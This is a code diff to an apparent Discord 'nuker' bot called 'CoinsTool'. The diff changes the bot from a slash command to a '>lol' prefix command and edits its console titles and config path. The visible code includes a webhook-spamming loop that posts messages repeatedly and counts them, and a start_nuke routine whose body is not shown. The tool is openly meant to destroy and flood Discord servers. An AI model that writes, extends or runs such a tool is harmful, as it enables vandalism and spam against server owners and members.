@@ -1,17 +1,13 @@
 import os
 import time
 import json
+from discord.ext import commands
 import threading
 import httpx
 import discord
+os.system("title (CoinsTool) Nuker")
 
-# Keep all the imports on top, you can also use or operator (||) to decide bw 2 commands,
-# no need to check if the user has windows or linux.
-
-# ctypes.windll.kernel32.SetConsoleTitleW("Nitro Nuker | Coin's Tool") (stop skidding off stack, learn os)
-os.system("title [Coin's Tools] Discord Nuker")
-
-with open("configs\\nukerconfig.json") as data:
+with open("configs/nukerconfig.json") as data:
     nukerconfig = json.load(data)
 if nukerconfig['token'] == '' or nukerconfig['userid'] == '':
     print("Please edit the nukerconfig.json file and add your bot's token and ur userid to it!")
@@ -48,7 +44,7 @@ $$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
 $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
 $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
 \__|  \__| \______/ \__|  \__| \_______|\__|      {white}
-{blue}/lol to nuke{white}""")
+{blue}>lol to nuke{white}""")
 
 x = 0
 def increment():
@@ -70,8 +66,8 @@ def idk():
     tp = threading.Thread(target=thread_task,args=(lock,))
     tp.start()
     tp.join()
-intents = discord.Intents().all()
-bot = discord.Bot(intents=intents)
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='>',intents=intents,help_command=None,activity = discord.Game(type=discord.ActivityType.watching,name=">help"))
 def spam_webhook(webhook):
     global white
     global red
@@ -82,8 +78,8 @@ def spam_webhook(webhook):
             r=httpx.post(url,json=data)
             if r.status_code == 204:
                 idk()
-                # ctypes.windll.kernel32.SetConsoleTitleW(f"Nuker - {x} Messages sent. | Coin's Tool")
-                os.system(f"title Coin's Nuker - {x} Messages sent.")
+                os.system(f"title (CoinsTool) Nuker - {x} messages sent")
+                #os.system(f"title Nuker - {x} Messages sent. | Coin's Tool")
             else:
                 print(f"{red}Rate Limit! {white}")
                 time.sleep(1)
@@ -107,8 +103,8 @@ async def start_nuke(guild):
 @bot.event
 async def on_ready():
     print(f"{bot.user} is ready and online!")
-@bot.slash_command(name = "lol", description = "Admin Only")
-async def nuke_code(ctx):
+@bot.command()
+async def lol(ctx):
     global useridlol
     print(useridlol)
     print(f"UserID: {ctx.author.id}")
